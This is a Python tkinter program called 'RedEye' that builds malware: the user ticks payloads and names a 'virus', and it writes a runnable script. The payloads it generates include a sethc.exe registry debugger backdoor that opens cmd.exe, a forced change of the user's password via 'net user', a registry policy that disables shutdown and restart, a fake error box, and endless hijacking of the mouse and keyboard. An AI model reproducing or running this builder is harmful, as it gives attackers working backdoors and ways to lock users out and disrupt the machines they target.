from tkinter import Label
from tkinter import *
from tkinter import messagebox
from tkinter import ttk
from tkinter import scrolledtext
import tkinter
import os
################################################
#                   main window
################################################
fontfam = '-family {Segoe UI} -size 14'
redeye=Tk()
redeye.geometry('400x600')
redeye.resizable(0,0)
redeye.configure(background='#333333')
redeye.title('RedEye  ----->ZerOne.Byte')
redeye.iconbitmap('logo.ico')
################################################
#                   Part One
################################################
core = LabelFrame(redeye)
core.place(relx=0.01,rely=0.01,relheight=0.6,relwidth=0.98)
core.configure(text='Capabilities')
core.configure(background='#333333')
core.configure(foreground='#46dd74')
core.configure(font = fontfam)
################################################
#                   Part Two
################################################
make = LabelFrame(redeye)
make.place(relx=0.01,rely=0.62,relheight=0.25,relwidth=0.98)
make.configure(background='#333333')
make.configure(text='Make')
make.configure(font = fontfam)
make.configure(foreground='#46dd74')

list1=["0","0","0","0","0","0","0","0"]
################################################
#                   Functions,Part One
################################################
#------BackDoor
def bk():
    if b.get()=='1':
        list1[0]='1'
    else:
        list1[0]='0'

#-----Password Chang
def password():
    if passw.get()=="1":
        list1[1]='2'
        p.place(relx=0.62,rely=0.12)
        
    else:
        list1[1]='0'
        p.place_forget()

#------ Open Web
def website():
    if webs.get()=="1":
        list1[2]='3'
        w.place(relx=0.52,rely=0.22)
        
    else:
        list1[2]='0'
        w.place_forget()

#--------Disable
def ch():
    if chh.get()=='1':
        list1[3]='4'
    else:
        list1[3]='0'

#------Mouse
def mu():
    if mm.get()=='1':
        list1[5]='6'
        
        
    else:
        list1[5]='0'
        

#------KeyBoard
def ke():
    if kk.get()=='1':
        list1[6]='7'
    else:
        list1[6]='0'

#------MessageBox
def ms():
    if msgv.get()=='1':
        list1[4]='5'
        msgt.place(relx=0.05,rely=0.75,relheight=0.2,relwidth=0.9)
    else:
        list1[4]='0'
        
        msgt.place_forget()



################################################
#                   Functions,Part Two
################################################

#---------Start Button
def sta():
    a = 0
    b = 0
    
    ename= n.get()
    passs = pasword.get()
    wweb = weeb.get()
    mmtt = mmt.get()
    status.delete("1.0","end")
    status.insert(INSERT,'Status\n------------\n')
    if ename=='':
        status.insert(INSERT,'Error: Name \n')
        b=1
    if list1[1] == '2':
        if passs == "":
            status.insert(INSERT,"Error: Pass\n")  
            b=1
    if list1[2] == '3':
        if wweb == "":
            status.insert(INSERT,"Error: Web\n")
            b=1
    if list1[4] == '5':
        if mmtt == '':
            status.insert(INSERT,"Error: Message\n")
            b=1

    if b == 0:
        if ename != '':
            try:
                fileout = open(f'Out\{ename}.txt','w')
            except FileExistsError:
                status.insert(INSERT,"Error: File \nExists\n")
        m = 'import os\nimport getpass\nimport winreg\nfrom tkinter import messagebox\nfrom tkinter import *\nimport tkinter\nimport random\n'
        nn = '''
try:
    import pynput
except:
    os.system('pip install pynput')
    import pynput
'''
        fileout.write(m)
        fileout.write(nn)
        for check in list1:
            if check == "1":
                code = """code = '''REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe ''' """

                cmd = 'os.system(code)'
                fileout.write(code+'\n')
                fileout.write(cmd+'\n')
                status.insert(INSERT,'OK: BackDoor\n')
            if check == "2":
                u = 'User = getpass.getuser()'
                p= f"password = '{passs}'"
                o = "os.system(f'net user {User} {password}')"
                fileout.write(u+'\n')
                fileout.write(p+'\n')
                fileout.write(o+'\n')
                status.insert(INSERT,'OK: Pass\n')
            if check == "3":
                open_web= f'os.system("start {wweb}")'
                fileout.write(open_web+'\n')
                status.insert(INSERT,'OK: Web\n')
            if check == "4":
                wi="winreg.CreateKey(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer')"
                ky="key = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)"
                su="sub = winreg.OpenKey(key,r'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer',0,winreg.KEY_WRITE)"
                wii="winreg.SetValueEx(sub,'NoClose',0,winreg.REG_DWORD,1)"

                fileout.write(wi+'\n')
                fileout.write(ky+'\n')
                fileout.write(su+'\n')
                fileout.write(wii+'\n')
                status.insert(INSERT,'OK: Shut\n')
            if check == "5":
                tt="t=Tk()"
                ttt="t.geometry('0x0')"
                tttt="t.resizable(0,0)"
                ttttt=f"messagebox.showerror('Error','{mmtt}')"

                fileout.write(tt+'\n')
                fileout.write(ttt+'\n')
                fileout.write(tttt+'\n')
                fileout.write(ttttt+'\n')
                status.insert(INSERT,'OK: MSG\n')
            if check=="6":
                ww = "while True:"
                
                a=1 
                mos="mos = pynput.mouse.Controller()"
                kb="kb = pynput.keyboard.Controller()"
                lx = "    a = random.randint(0,1000)"
                ly="    b = random.randint(0,1000)"
                run = "    mos.position = (a , b)"
                fileout.write(mos+'\n')
                fileout.write(kb+'\n')
                fileout.write(ww+'\n')
                fileout.write(lx+'\n')
                fileout.write(ly+'\n')
                fileout.write(run+'\n')
                status.insert(INSERT,'OK: Mous\n')

            if check=="7":
                if a == 0:
                    kb="    kb = pynput.keyboard.Controller()"
                    ww = "while True:"
                    fileout.write(kb+'\n')
                    fileout.write(ww+'\n')
                    
                bb = "    kb.press('h')"
                bbb="    kb.press('a')  "  
                    
                fileout.write(bb+'\n')
                fileout.write(bbb+'\n')
                status.insert(INSERT,'OK: Keyboard\n')
        fileout.close()
        status.insert(INSERT,'************\n')
        status.insert(INSERT,'OK: DONE\n')
        myfile = f'Out\{ename}.txt'
        base = os.path.splitext(myfile)[0]
        try:
            os.rename(myfile, base + '.py')  
            messagebox.showinfo('Finish','Done file creation process')
        except FileExistsError:
            os.remove(myfile)
            status.delete("1.0","end")
            status.insert(INSERT,'Status\n------------\n')
            status.insert(INSERT,"Error: File \nExists\n")
            messagebox.showwarning('Warning','There is a file with the same names')
#---------Clear Button
def cl():
    nam.delete(0,END)
    p.delete(0,END)
    w.delete(0,END)
    msgt.delete(0,"end")
    status.delete("1.0","end")
    status.insert(INSERT,'Status\n------------\n')

#------Contact Button
def contact():
    os.system("start https://github.com/ZerOne-Byte")
    os.system("start https://t.me/ZerOneByte")
    os.system("start https://www.instagram.com/zerone.byte/")
    

################################################
#                   objects,Part One
################################################

#---------BackDoor
b = StringVar(redeye)
b.set(0)
back = Checkbutton(core,variable=b,command=bk, text = 'Mack A Simple BackDoor',fg='red',bg='#333333',font = '-family {Segoe UI} -size 15',activebackground='#333333')
back.place(relx=0.05,rely=0.00,relheight=0.1,relwidth=0.63)

#--------Password
passw =StringVar(redeye)
passw.set(0)
pas = Checkbutton(core,variable =passw,text = 'Change Password To :',fg='red',bg='#333333',font = '-family {Segoe UI} -size 15',activebackground='#333333',command = password)
pas.place(relx=0.05,rely=0.10,relheight=0.1,relwidth=0.55)
pasword=StringVar()
p= Entry(core,textvariable=pasword,width=12,font = '-family {Segoe UI} -size 11',background='#333333',fg='#ffffff')

#--------Open Web
webs = StringVar(redeye)
webs.set(0)
web = Checkbutton(core,variable =webs,text = 'Open Web Page :',fg='red',bg='#333333',font = '-family {Segoe UI} -size 15',activebackground='#333333',command = website)
web.place(relx=0.05,rely=0.20,relheight=0.1,relwidth=0.45)
weeb= StringVar()
w= Entry(core,textvariable=weeb,width=20,font = '-family {Segoe UI} -size 11',background='#333333',fg='#ffffff')



#-------Disable

chh = StringVar(redeye)
chh.set(0)
click = Checkbutton(core,variable=chh,command=ch,text = 'Disable Shutdown,Sleep,Restart',fg='red',bg='#333333',font = '-family {Segoe UI} -size 15',activebackground='#333333')
click.place(relx=0.05,rely=0.30,relheight=0.1,relwidth=0.77)

#------Mouse
mm = StringVar(redeye)
mm.set(0)
Mous = Checkbutton(core,variable=mm,command=mu, text = 'Crazy Mous',fg='red',bg='#333333',font = '-family {Segoe UI} -size 15',activebackground='#333333')
Mous.place(relx=0.05,rely=0.40,relheight=0.1,relwidth=0.32)

#------KeyBoard
kk = StringVar(redeye)
kk.set(0)
key = Checkbutton(core,variable=kk,command=ke, text = 'Crazy keyboard',fg='red',bg='#333333',font = '-family {Segoe UI} -size 15',activebackground='#333333')
key.place(relx=0.05,rely=0.50,relheight=0.1,relwidth=0.41)

#------MessageBox
msgv = StringVar(redeye)
msgv.set(0)
msg = Checkbutton(core,variable =msgv,text = 'Show MessageBox ',fg='red',bg='#333333',font = '-family {Segoe UI} -size 15',activebackground='#333333',command = ms)
msg.place(relx=0.05,rely=0.60,relheight=0.1,relwidth=0.48)
#t = StringVar()
mmt= StringVar()
msgt=Entry(core,textvariable=mmt,fg='red',bg='#333333',font = '-family {Segoe UI} -size 12')


################################################
#                   objects,Part Two
################################################

#------Name For Virus
name =Label(make,text = 'Name For Virus: ',fg='red',bg='#333333',font = '-family {Segoe UI} -size 12')
name.place(relx=0.01,rely=0.0,relheight=0.2,relwidth=0.3)
n=StringVar()
nam= Entry(make,textvariable=n,width=10,background='#333333',fg='#ffffff',font = '-family {Segoe UI} -size 11')
nam.place(relx=0.32,rely=0.0,relheight=0.2,relwidth=0.3)

#-----Statuse
status=scrolledtext.ScrolledText(make,bg='#333333',fg='red',font = '-family {Segoe UI} -size 12')
status.place(relx=0.65,rely=0.0,relheight=0.9,relwidth=0.32)
status.insert(INSERT,'Status\n------------\n')


#------Start
start=Button(make,command=sta,text='Start Making...',bg='#333333',fg='red',font = '-family {Segoe UI} -size 12',activebackground='#0aff55')
start.place(relx=0.03,rely=0.3,relheight=0.25,relwidth=0.30)

#----- Clear
clear=Button(make,text='Clear',bg='#333333',fg='red',font = '-family {Segoe UI} -size 12',activebackground='#0aff55',command =cl)
clear.place(relx=0.4,rely=0.3,relheight=0.25,relwidth=0.18)




#------Contact
contact=Button(make,text='Contact With Me',bg='#333333',fg='red',font = '-family {Segoe UI} -size 12',activebackground='#0aff55',command = contact)
contact.place(relx=0.16,rely=0.65,relheight=0.25,relwidth=0.35)


################################################
#                   objects,END
################################################

#---------CopyRight
copy= Label(redeye,text='CopyRight: ZerOne.Byte',fg='#0aff55',bg='#333333',font='-family {Segoe UI} -size 10')
copy.place(relx=0.30,rely=0.88)
#---------Telegram
me = Label(redeye,text='Telegram: @ZerOneByte - Instagram: @ZerOne.Byte - Github: @ZerOne-Byte',fg='#0aff55',bg='#333333',font='-family {Segoe UI} -size 8')
me.place(relx=0.0,rely=0.95)


redeye.mainloop()